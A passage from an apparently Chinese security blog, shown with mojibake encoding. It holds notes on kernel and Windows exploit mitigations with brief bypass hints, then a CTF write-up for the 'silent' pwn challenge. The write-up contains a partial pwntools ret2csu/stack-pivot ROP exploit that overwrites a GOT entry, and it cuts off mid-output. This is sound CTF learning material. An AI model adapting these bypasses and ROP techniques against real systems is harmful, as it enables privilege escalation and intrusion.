<p>åœ¨å¼€å¯äº† KASLR çš„å†…æ ¸ä¸­ï¼Œå†…æ ¸çš„ä»£ç æ®µåŸºåœ°å€ç­‰åœ°å€ä¼šæ•´ä½“åç§»ã€‚</p>
<h4 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h4><p>Supervisor Mode Access Preventionï¼Œç®¡ç†æ¨¡å¼è®¿é—®ä¿æŠ¤ã€‚</p>
<p>å¦‚æœå†…æ ¸æ€å¯ä»¥è®¿é—®ç”¨æˆ·æ€çš„æ•°æ®ï¼Œä¹Ÿä¼šå‡ºç°é—®é¢˜ã€‚æ¯”å¦‚åœ¨åŠ«æŒæ§åˆ¶æµåï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ ˆè¿ç§»å°†æ ˆè¿ç§»(pop rspç±»ä¼¼çš„æŒ‡ä»¤)åˆ°ç”¨æˆ·æ€ï¼Œç„¶åè¿›è¡Œ ROPï¼Œè¿›ä¸€æ­¥è¾¾åˆ°ææƒçš„ç›®çš„ã€‚</p>
<p>åœ¨ Linux å†…æ ¸ä¸­ï¼Œè¿™ä¸ªé˜²å¾¡æªæ–½çš„å®ç°æ˜¯ä¸<strong>æŒ‡ä»¤é›†æ¶æ„ç›¸å…³</strong>çš„ã€‚x86 ä¸‹å¯¹åº”çš„ä¿æŠ¤æœºåˆ¶çš„åå­—ä¸º SMAPã€‚CR4 å¯„å­˜å™¨ä¸­çš„ç¬¬ 21 ä½ç”¨æ¥æ ‡è®°æ˜¯å¦å¼€å¯ SMEP ä¿æŠ¤ã€‚</p>
<p>x86CPUçš„ç‰¹æ€§ï¼Œéœ€è¦CPUå’Œæ“ä½œç³»ç»Ÿæ”¯æŒã€‚bypass: ä¿®æ”¹cr4</p>
<h4 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h4><p>Supervisor Mode Execution Preventionï¼Œç®¡ç†æ¨¡å¼æ‰§è¡Œä¿æŠ¤ã€‚</p>
<p>åœ¨å†…æ ¸æ€æ‰§è¡Œä»£ç æ—¶ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç ã€‚é‚£å¦‚æœæ”»å‡»è€…<strong>æ§åˆ¶äº†å†…æ ¸ä¸­çš„æ‰§è¡Œæµï¼Œå°±å¯ä»¥æ‰§è¡Œå¤„äºç”¨æˆ·æ€çš„ä»£ç </strong>ã€‚ç”±äºç”¨æˆ·æ€çš„ä»£ç æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œæ‰€ä»¥æ›´å®¹æ˜“å®æ–½æ”»å‡»ã€‚ä¸ºäº†é˜²èŒƒè¿™ç§æ”»å‡»ï¼Œç ”ç©¶è€…æå‡ºå½“ä½äºå†…æ ¸æ€æ—¶ï¼Œä¸èƒ½æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç ã€‚</p>
<p>åœ¨ Linux å†…æ ¸ä¸­ï¼Œè¿™ä¸ªé˜²å¾¡æªæ–½çš„å®ç°æ˜¯ä¸<strong>æŒ‡ä»¤é›†æ¶æ„ç›¸å…³</strong>çš„(ARM PXN)ã€‚x86ä¸‹ <code>CR4</code> å¯„å­˜å™¨ä¸­çš„ç¬¬ 20 ä½ç”¨æ¥æ ‡è®°æ˜¯å¦å¼€å¯ SMEP ä¿æŠ¤ã€‚</p>
<p>æŸ¥çœ‹æ˜¯å¦å¼€å¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep smap /proc/cpuinfo  <span class="comment"># å¦‚æœå‡ºç°ç»“æœï¼Œè¯´æ˜å¼€å¯</span></span><br></pre></td></tr></table></figure>

<p>bypass: ä¿®æ”¹cr4</p>
<h4 id="kpti"><a href="#kpti" class="headerlink" title="kpti"></a>kpti</h4><p>Kernel Page Table Isolationï¼Œå†…æ ¸é¡µè¡¨éš”ç¦»</p>
<p>åœ¨ x86_64 çš„ PTI æœºåˆ¶ä¸­ï¼Œ<strong>å†…æ ¸æ€çš„ç”¨æˆ·ç©ºé—´å†…å­˜æ˜ å°„éƒ¨åˆ†è¢«å…¨éƒ¨æ ‡è®°ä¸ºä¸å¯æ‰§è¡Œ</strong>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¹‹å‰ä¸å…·æœ‰ SMEP ç‰¹æ€§çš„ç¡¬ä»¶ï¼Œå¦‚æœå¼€å¯äº† KPTI ä¿æŠ¤ï¼Œä¹Ÿå…·æœ‰äº†ç±»ä¼¼äº SMEP çš„ç‰¹æ€§ã€‚æ­¤å¤–ï¼ŒSMAP æ¨¡æ‹Ÿä¹Ÿå¯ä»¥ä»¥ç±»ä¼¼çš„æ–¹å¼å¼•å…¥ï¼Œåªæ˜¯ç°åœ¨è¿˜æ²¡æœ‰å¼•å…¥ã€‚å› æ­¤ï¼Œåœ¨ç›®å‰å¼€å¯äº† KPTI ä¿æŠ¤çš„å†…æ ¸ä¸­ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯ SMAP ä¿æŠ¤ï¼Œé‚£ä¹ˆå†…æ ¸ä»ç„¶å¯ä»¥è®¿é—®ç”¨æˆ·æ€ç©ºé—´çš„å†…å­˜ï¼Œåªæ˜¯ä¸èƒ½è·³è½¬åˆ°ç”¨æˆ·æ€ç©ºé—´æ‰§è¡Œ Shellcodeã€‚</p>
<p>bypass</p>
<ul>
<li>signal handler</li>
<li>swapgs_restore_regs_and_return_to_usermode å‡½æ•°ä¸­å­˜åœ¨å¯ä»¥æ”¹å˜ cr3 çš„gadget</li>
</ul>
<h4 id="fgkaslr"><a href="#fgkaslr" class="headerlink" title="fgkaslr"></a>fgkaslr</h4><p>FGKASLR åœ¨ KASLR åŸºåœ°å€éšæœºåŒ–çš„åŸºç¡€ä¸Šï¼Œåœ¨åŠ è½½æ—¶åˆ»ï¼Œä»¥å‡½æ•°ç²’åº¦é‡æ–°æ’å¸ƒå†…æ ¸ä»£ç ã€‚ç›®å‰ï¼ŒFGKASLR åªæ”¯æŒ <strong>x86_64</strong> æ¶æ„ã€‚</p>
<p>FGKASLR åˆ©ç”¨ gcc çš„ç¼–è¯‘é€‰é¡¹Â <code>-ffunction-sections</code>Â æŠŠå†…æ ¸ä¸­ä¸åŒçš„å‡½æ•°æ”¾åˆ°ä¸åŒçš„ section ä¸­ã€‚ åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ï¼Œä»»ä½•ä½¿ç”¨ C è¯­è¨€ç¼–å†™çš„å‡½æ•°ä»¥åŠä¸åœ¨ç‰¹æ®Šè¾“å…¥èŠ‚çš„å‡½æ•°éƒ½ä¼šå•ç‹¬ä½œä¸ºä¸€ä¸ªèŠ‚ï¼›ä½¿ç”¨æ±‡ç¼–ç¼–å†™çš„ä»£ç ä¼šä½äºä¸€ä¸ªç»Ÿä¸€çš„èŠ‚ä¸­ã€‚</p>
<p>å¦‚æœæƒ³è¦å¼€å¯å†…æ ¸çš„ FGKASLRï¼Œä½ éœ€è¦å¼€å¯Â <code>CONFIG_FG_KASLR=y</code>Â é€‰é¡¹ã€‚</p>
<h4 id="Kernel-Stack-Canary"><a href="#Kernel-Stack-Canary" class="headerlink" title="Kernel Stack Canary"></a>Kernel Stack Canary</h4><p>åœ¨ç¼–è¯‘å†…æ ¸æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½® CONFIG_CC_STACKPROTECTOR é€‰é¡¹ï¼Œæ¥å¼€å¯è¯¥ä¿æŠ¤</p>
<p>åœ¨ x86 æ¶æ„ä¸­ï¼ŒåŒä¸€ä¸ª task ä¸­ä½¿ç”¨ç›¸åŒçš„ Canaryã€‚</p>
<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><blockquote>
<p>å®‰å“ä½¿ç”¨ Linux Kernelï¼Œæœ‰äº›ä¿æŠ¤å¹¶éç‰¹æœ‰ï¼Œè€Œæ˜¯æ˜¯å¦é»˜è®¤å¼€å¯ã€‚</p>
</blockquote>
<h3 id="pxn"><a href="#pxn" class="headerlink" title="pxn"></a>pxn</h3><p>Privileged Execute-Neverã€‚å†…æ ¸å®‰å…¨ç‰¹æ€§ï¼Œç”¨æ¥é˜»æ­¢å†…æ ¸ç›´æ¥æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ï¼Œèƒ½å¤Ÿæå¤§åœ°æå‡æ¼æ´åˆ©ç”¨çš„éš¾åº¦ã€‚</p>
<p>å’Œ smep ä¸€ä¸ªæ€§è´¨</p>
<p>armv8åŠä»¥ä¸Šç‰ˆæœ¬çš„PXNç‰¹æ€§ç”±ç¡¬ä»¶æ”¯æŒï¼ŒAndroid 5 arm64åå¼€å¯ï¼ŒAndroidé€šè¿‡é¡µè¡¨æ¥å¼€å¯PXNã€‚</p>
<h3 id="pan"><a href="#pan" class="headerlink" title="pan"></a>pan</h3><p>smap ç±»ä¼¼çš„æ€§è´¨</p>
<h3 id="cfi"><a href="#cfi" class="headerlink" title="cfi"></a>cfi</h3><p>Control-Flow Integrity æ§åˆ¶æµå®Œæ•´æ€§</p>
<p>å…¶æ ¸å¿ƒæ€æƒ³æ˜¯<strong>é™åˆ¶ç¨‹åºè¿è¡Œä¸­çš„æ§åˆ¶è½¬ç§»ï¼Œä½¿ä¹‹å§‹ç»ˆå¤„äºåŸæœ‰çš„æ§åˆ¶æµå›¾æ‰€é™å®šçš„èŒƒå›´å†…</strong>ã€‚å…·ä½“åšæ³•æ˜¯é€šè¿‡åˆ†æç¨‹åºçš„æ§åˆ¶æµå›¾ï¼Œè·å–é—´æ¥è½¬ç§»æŒ‡ä»¤ï¼ˆåŒ…æ‹¬é—´æ¥è·³è½¬ã€é—´æ¥è°ƒç”¨ã€å’Œå‡½æ•°è¿”å›æŒ‡ä»¤ï¼‰ç›®æ ‡çš„ç™½åå•ï¼Œå¹¶åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ ¸å¯¹é—´æ¥è½¬ç§»æŒ‡ä»¤çš„ç›®æ ‡æ˜¯å¦åœ¨ç™½åå•ä¸­ã€‚æ§åˆ¶æµåŠ«æŒæ”»å‡»å¾€å¾€ä¼šè¿èƒŒåŸæœ‰çš„æ§åˆ¶æµå›¾ï¼ŒCFIä½¿å¾—è¿™ç§æ”»å‡»è¡Œä¸ºéš¾ä»¥å®ç°ï¼Œä»è€Œä¿éšœè½¯ä»¶ç³»ç»Ÿçš„å®‰å…¨ã€‚</p>
<p>å†…æ ¸ CFI æ‰‹åŠ¨å¯ç”¨ï¼Œx86é€šè¿‡æ­¤å¼€å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure>

<h3 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h3><p>Android 8.0ä¹‹åæ¨å‡ºå‚å•†å‡çº§æˆæœ¬å¤§å¤§é™ä½ï¼Œ8.0ä¹‹åå¢åŠ vendor.imgé•œåƒ ï¼Œæ”»å‡»é¢å¤§å¤§å‡å°‘ï¼Œ å¾ˆå¤šå‚å•†çš„ä»£ç ä¸ä¸åº”ç”¨å±‚ç›´æ¥äº¤äº’ï¼Œ å¢åŠ äº†åº”ç”¨å’Œå‚å•†ä»£ç çš„SELinuxé™åˆ¶</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>ä¸ Linux ç›¸åŒï¼ŒASLR ä¿æŠ¤æŒ‡çš„æ˜¯åœ°å€éšæœºåŒ–æŠ€æœ¯(Address Space Layout Randomization)ï¼Œè¿™é¡¹æŠ€æœ¯å°†åœ¨ç¨‹åºå¯åŠ¨æ—¶å°† DLL éšæœºçš„åŠ è½½åˆ°å†…å­˜ä¸­çš„ä½ç½®ï¼Œè¿™å°†ç¼“è§£æ¶æ„ç¨‹åºçš„åŠ è½½ã€‚ASLR è‡ª Windows 10 å¼€å§‹å·²ç»åœ¨ç³»ç»Ÿä¸­è¢«é…ç½®ä¸ºé»˜è®¤å¯ç”¨ã€‚</p>
<h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>Data Execute Protector</p>
<p><code>VirtualAlloc()</code>å¯ä»¥è®¾ç½®æƒé™ï¼Œè®¾ç½®ä¸º&#96;</p>
<h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><p>è¿™ä¸ªä¿æŠ¤ç±»ä¼¼äº Linux ä¸­çš„ Canary ä¿æŠ¤ï¼Œä¸€æ—¦å¼€å¯ï¼Œä¼šåœ¨è¿”å›åœ°å€å’Œ BP ä¹‹å‰å‹å…¥ä¸€ä¸ªé¢å¤–çš„ <strong>Security Cookie</strong>ã€‚ç³»ç»Ÿä¼šæ¯”è¾ƒæ ˆä¸­çš„è¿™ä¸ªå€¼å’ŒåŸå…ˆå­˜æ”¾åœ¨ .data ä¸­çš„å€¼åšä¸€ä¸ªæ¯”è¾ƒã€‚å¦‚æœä¸¤è€…ä¸å»åˆï¼Œè¯´æ³•æ ˆä¸­å‘ç”Ÿäº†æº¢å‡ºã€‚</p>
<h3 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h3><p>DLL æ··æ·†çº§ä¿æŠ¤ã€‚</p>
<h3 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h3><p>è¢«ç§°ä¸ºéš”ç¦»ä¿æŠ¤ï¼Œä¸€æ—¦å¼€å¯ï¼Œè¡¨ç¤ºæ­¤ç¨‹åºåŠ è½½æ—¶å°†ä¼šåœ¨ä¸€ä¸ªç›¸å¯¹ç‹¬ç«‹çš„éš”ç¦»ç¯å¢ƒä¸­è¢«åŠ è½½ï¼Œä»è€Œé˜»æ­¢æ”»å‡»è€…è¿‡åº¦æå‡æƒé™ã€‚</p>
<h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><p>ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆStructured Exception Handlingï¼Œç®€ç§° SEHï¼‰æ˜¯ä¸€ç§ <code>Windows</code> æ“ä½œç³»ç»Ÿå¯¹é”™è¯¯æˆ–å¼‚å¸¸æä¾›çš„å¤„ç†æŠ€æœ¯ã€‚ä¸ºWindows çš„ç¨‹åºè®¾è®¡è€…æä¾›äº†ç¨‹åºé”™è¯¯æˆ–å¼‚å¸¸çš„å¤„ç†é€”å¾„ï¼Œä½¿å¾—ç³»ç»Ÿæ›´åŠ å¥å£®ã€‚</p>
<h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p>å®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå³ç™½åå•å®‰å…¨æ²™ç®±ï¼Œäº‹å…ˆå®šä¹‰ä¸€äº›å¼‚å¸¸å¤„ç†ç¨‹åºï¼Œå¹¶åŸºäºæ­¤æ„é€ å®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†è¡¨ï¼Œç¨‹åºæ­£å¼è¿è¡Œåï¼Œå®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†è¡¨ä¹‹å¤–çš„å¼‚å¸¸å¤„ç†ç¨‹åºå°†ä¼šè¢«é˜»æ­¢è¿è¡Œã€‚</p>
<h3 id="SMEP-SMAP"><a href="#SMEP-SMAP" class="headerlink" title="SMEP SMAP"></a>SMEP SMAP</h3><p>windows10 ä¹‹åå¼•å…¥ SMEPå’ŒSMAP</p>
<h3 id="KVAS"><a href="#KVAS" class="headerlink" title="KVAS"></a>KVAS</h3><p>å†…æ ¸è™šæ‹Ÿåœ°å€å½±å­ï¼ˆKernel Virtual Address Shadowï¼Œç”±å¾®è½¯æå‡ºçš„ä¸€ä¸ªæœ¯è¯­ï¼Œç®€ç§°KVASï¼‰ï¼Œç”±äºè¯¥ç‰¹æ€§ä»…å…è®¸ç”¨æˆ·æ¨¡å¼ä»£ç è®¿é—®æœ‰é™çš„å†…æ ¸å†…å­˜ï¼Œå› æ­¤èƒ½æœ‰æ•ˆé˜²èŒƒMeltdownæ”»å‡»ã€‚æ˜¯å¾®è½¯åœ¨Windowsç³»ç»Ÿä¸Šå¯¹KPTIçš„å…·ä½“å®ç°æ–¹å¼</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul>
<li><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/readme/">CTF-wili</a></li>
<li><a href="https://source.android.google.cn/docs/security/test/cfi?hl=zh-cn">android CFI</a></li>
<li><a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">Control Flow Integrity â€” Clang</a></li>
<li><a href="https://www.cnblogs.com/pwnfeifei/p/17162374.html">windows pwn</a></li>
<li><a href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/">Windows_Pwnå­¦ä¹ </a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>ç¨‹åºç¼“è§£æœºåˆ¶</tag>
      </tags>
  </entry>
  <entry>
    <title>é¹ç¨‹æ¯</title>
    <url>/2023/11/04/%E9%B9%8F%E7%A8%8B%E6%9D%AF%20CTF/</url>
    <content><![CDATA[<blockquote>
<p>CTF PWN</p>
</blockquote>
<span id="more"></span>

<p>è°ƒè¯•æ—¶å»é™¤alarmå‡½æ•°ï¼šä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨ï¼Œå°†æ‰€æœ‰çš„alarmæ”¹æˆ <code>isnan</code></p>
<p>æˆ–è€…ä½¿ç”¨å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g &lt;äºŒè¿›åˆ¶æ–‡ä»¶&gt;</span><br></pre></td></tr></table></figure>
<h2 id="slient"><a href="#slient" class="headerlink" title="slient"></a>slient</h2><p>å¼€å¯PIEå’ŒNXä¿æŠ¤ï¼Œæ¼æ´ç‚¹æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">init_seccomp</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>æ²¡æœ‰putsï¼Œwriteç­‰å¯ä»¥è¿›è¡Œæ³„éœ²çš„å‡½æ•°ã€‚æ€è·¯ä¸ºå°†æŸäº›å‡½æ•°çš„gotè¡¨è¯»å…¥bssæ®µï¼Œä½¿ç”¨ret2csuã€‚</p>
<ul>
<li>è¯»gotè¡¨éœ€è¦gadgetè‡³å°‘å­˜åœ¨å¯ä»¥ä¿®æ”¹åœ°å€å†…å®¹ç‰‡æ®µï¼Œå½¢å¦‚ <code>mov [xxx], xxx</code> ã€‚ç”¨äºå–å€¼ï¼Œè€Œä¸”éœ€è¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶å¯„å­˜å™¨çš„å†…å®¹</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary silent</span><br><span class="line">0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span><br></pre></td></tr></table></figure>


<ol>
<li>æ ˆæº¢å‡ºï¼Œä½¿ç”¨ret2csuï¼Œå‘bssæ®µè¯»å…¥ROP chainã€‚</li>
<li>æ ˆè¿ç§»ï¼Œè½¬åˆ°bssæ®µçš„ROPchainæ‰§è¡Œ</li>
</ol>
<ul>
<li>ä½¿ç”¨magic ä¿®æ”¹read_got è¡¨å†…å®¹ä¸ºsyscall</li>
<li>æ³„éœ²å‡ºlibc_base</li>
<li>ç»§ç»­read ROPchianï¼Œæ ˆè¿ç§»æ‰§è¡ŒROPchain</li>
</ul>
<p>éœ€è¦æ³¨æ„</p>
<ul>
<li>å–magic gadgetä¸­çš„ebxæ—¶ï¼Œå¦‚æœebxçš„å€¼ä¸ºæ­£ï¼Œåˆ™ç›´æ¥å–ï¼Œå¦‚æœä¸º<strong>è´Ÿï¼ŒåŠ 0x100000000å–è¡¥ç </strong>ã€‚</li>
<li>æ§åˆ¶raxï¼Œä½¿ç”¨å‡½æ•°è¿”å›å€¼æ˜¯raxæ¥æ§åˆ¶</li>
<li>æ ˆè¿ç§»çš„é‡ç‚¹æ˜¯æ§åˆ¶rspï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ pop_rsp ç›´æ¥æ§åˆ¶ã€‚</li>
</ul>
<p>æœ€ç»ˆçš„exp</p>
<ul>
<li>è°ƒè¯•äºŒä¸‰åæ¬¡æ‰æ˜ç™½ï¼Œ<del>ä½†æ˜¯å¾ˆå¿«å°±ä¼šå¿˜</del>ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">num=<span class="number">4096</span></span>): <span class="keyword">return</span> p.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>): gdb.attach(p)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;silent_patched&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line">pop_rbp_ret = <span class="number">0x0000000000400788</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400963</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400961</span></span><br><span class="line">ret = <span class="number">0x0000000000400696</span></span><br><span class="line">leave_ret = <span class="number">0x0000000004008FC</span></span><br><span class="line">pop_rsp_r13_r14_r15 = <span class="number">0x000000000040095d</span></span><br><span class="line">magic = <span class="number">0x00000000004007e8</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt.read</span><br><span class="line">read_got = elf.got.read</span><br><span class="line"></span><br><span class="line">csu_front = <span class="number">0x400940</span></span><br><span class="line">csu_end = <span class="number">0x40095A</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line">stdout = <span class="number">0x601020</span></span><br><span class="line">main_addr = <span class="number">0x0400878</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">csu:    0, 1, call, rdi, rsi, rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.text:0000000000400940 4C 89 FA                      mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:0000000000400943 4C 89 F6                      mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400946 44 89 EF                      mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000400949</span></span><br><span class="line"><span class="string">.text:000000000040094D 48 83 C3 01                   add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400951 48 39 DD                      cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:0000000000400954 75 EA                         jnz     short loc_400940</span></span><br><span class="line"><span class="string">.text:0000000000400954</span></span><br><span class="line"><span class="string">.text:0000000000400956</span></span><br><span class="line"><span class="string">.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34â†‘j</span></span><br><span class="line"><span class="string">.text:0000000000400956 48 83 C4 08                   add     rsp, 8</span></span><br><span class="line"><span class="string">.text:000000000040095A 5B                            pop     rbx</span></span><br><span class="line"><span class="string">.text:000000000040095B 5D                            pop     rbp</span></span><br><span class="line"><span class="string">.text:000000000040095C 41 5C                         pop     r12</span></span><br><span class="line"><span class="string">.text:000000000040095E 41 5D                         pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400960 41 5E                         pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400962 41 5F                         pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400964 C3                            retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p1 = cyclic(<span class="number">64</span> + <span class="number">8</span>)</span><br><span class="line">p1 += flat([</span><br><span class="line">    csu_end, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x800</span>, <span class="number">0x400</span>,</span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, bss+<span class="number">0x800</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    leave_ret</span><br><span class="line">])</span><br><span class="line">s(p1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss ROP chain</span></span><br><span class="line"><span class="comment"># è°ƒç”¨bssæ®µçš„ä»£ç ï¼Œç„¶åæœ€å pop rbp ç»™rbpæŒ‡å®šä¸€ä¸ªå€¼ï¼Œå°±æ˜¯ stdout+0x3d</span></span><br><span class="line"><span class="comment"># è°ƒç”¨magic gadget ï¼Œ[stdout] å†…å®¹</span></span><br><span class="line"><span class="comment"># 0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; x/2xg &amp;stdout</span></span><br><span class="line"><span class="string">0x601020 &lt;stdout@@GLIBC_2.2.5&gt;: 0x00007fc4d7fec760      0x0000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; p syscall</span></span><br><span class="line"><span class="string">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fc4d7d1b520 &lt;syscall&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x/10wi 0x7fc4d7d1b520</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b520 &lt;syscall&gt;:    mov    rax,rdi</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b523 &lt;syscall+3&gt;:  mov    rdi,rsi</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b526 &lt;syscall+6&gt;:  mov    rsi,rdx</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b529 &lt;syscall+9&gt;:  mov    rdx,rcx</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b52c &lt;syscall+12&gt;: mov    r10,r8</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b52f &lt;syscall+15&gt;: mov    r8,r9</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b532 &lt;syscall+18&gt;: mov    r9,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b537 &lt;syscall+23&gt;: syscall</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b539 &lt;syscall+25&gt;: cmp    rax,0xfffffffffffff001</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b53f &lt;syscall+31&gt;: jae    0x7fc4d7d1b542 &lt;syscall+34&gt;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">pwndbg&gt; p write</span></span><br><span class="line"><span class="string">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fc4d7d100f0 &lt;write&gt;</span></span><br><span class="line"><span 